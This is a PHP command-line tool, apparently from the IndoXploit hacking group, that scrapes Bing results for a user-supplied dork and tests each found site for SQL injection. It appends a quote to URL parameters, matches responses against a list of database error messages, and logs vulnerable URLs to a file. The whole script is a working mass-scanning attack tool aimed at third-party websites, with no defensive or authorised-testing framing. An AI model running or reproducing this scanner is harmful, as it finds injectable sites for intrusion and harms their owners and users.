<?php
// SQL Scanner via Bing Dorker
// Coded by Mr. Error 404 ( l0c4lh34rtz) - IndoXploit
// Recoded By Hiroyuki48

set_time_limit(0);
error_reporting(0);
@ini_set('memory_limit', '64M');
@header('Content-Type: text/html; charset=UTF-8');
function head(){
$head.="     |-+-+-+-+-+-+-+-+-+-+-+|  \r\n";
$head.="     |hiroyuki48  hiroyuki48|  \r\n";
$head.="     |hiroy|   |uk|   |i48hi|  \r\n";
$head.="     |royuk|   |i4|   |8hiro|  \r\n";
$head.="     |yuki4|   |__|   |8hiro|  \r\n";
$head.="     |yuki4|          |8hiro|  Tool  :\r\n"; 
$head.="     |yuki4|    __    |8hiro|  SQL Scanner via Bing Dorker\r\n";
$head.="     |yuki4|   |8h|   |iroyu|  \r\n";
$head.="     |ki48h|   |ir|   |oyuki|  example Dork : \"order.php?id=\" site:de\r\n";
$head.="     |48hir|   |oy|   |uki48|  Thanks For : l0c4lh34rtz\r\n";
$head.="     |hiroyuki48  hiroyuki48|  Develop : HIROYUKI\r\n";
$head.="     |-+-+-+-+-+-+-+-+-+-+-+|  \r\n";
echo $head;
}
$error[] = 'You have an error in your SQL';
$error[] = 'supplied argument is not a valid MySQL result resource in';
$error[] = 'Division by zero in';
$error[] = 'Call to a member function';
$error[] = 'Microsoft JET Database';
$error[] = 'ODBC Microsoft Access Driver';
$error[] = 'Microsoft OLE DB Provider for SQL Server';
$error[] = 'Unclosed quotation mark';
$error[] = 'Microsoft OLE DB Provider for Oracle';
$error[] = 'Incorrect syntax near';
$error[] = 'SQL query failed';
$error[] = 'Warning: filesize()';
$error[] = 'Warning: preg_match()';
$error[] = 'Warning: array_merge()';
$error[] = 'Warning: mysql_query()';
$error[] = 'Warning: mysql_num_rows()';
$error[] = 'Warning: session_start()';
$error[] = 'Warning: getimagesize()';
$error[] = 'Warning: mysql_fetch_array()';
$error[] = 'Warning: mysql_fetch_assoc()';
$error[] = 'Warning: is_writable()';
$error[] = 'Warning: Unknown()';
$error[] = 'Warning: mysql_result()';
$error[] = 'Warning: pg_exec()';
$error[] = 'Warning: require()';

function curl($url) {
    $curl = curl_init($url);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    $content = curl_exec($curl);
    curl_close($curl);
    return $content;
}
function injek($url) {
	$data = curl(str_replace("=", "='", $url));
    $errors = implode("|", $GLOBALS['error']);
    return preg_match("#{$errors}#i", $data);
}
function save($isi) {
	$f = fopen("hasil_vuln.txt","a+");
	fwrite($f, "$isi\r\n");
	fclose($f);
}
head();
echo "Masukan Dork: ";
$dork = trim(fgets(STDIN));
$dork = urlencode($dork);
if(!$dork){
	echo "Harap Input Dork!";
	exit();
}
if(isset($dork)){
	$npage = 1;
	$npages = 30000;
	$allLinks = array();
	$lll = array();
	while($npage <= $npages) {
	    $x = curl("http://www.bing.com/search?q=".$dork."&first=".$npage);
	    if($x) {
	        preg_match_all('#<h2><a href="(.*?)" h="ID#', $x, $findlink);
	        foreach ($findlink[1] as $fl) array_push($allLinks, $fl);
	        $npage = $npage + 10;
	        if (preg_match("(first=" . $npage . "&amp)siU", $x, $linksuiv) == 0) break;
	    } else break;
	}
	foreach($allLinks as $url) {
		$urls = parse_url($url, PHP_URL_HOST);
		$urls = "http://$urls/";
		if($_SESSION[$urls]) {
			//
		} else {
			$_SESSION[$urls] = "1";
			if(injek($url)) {
				echo "\33[1;33m$url -> \33[1;32mVuln!!\e[95m\n";
				save($url);
			}
		}
	}
} else {
echo	"SALAH GOBLOK!";
exit();
}
?>
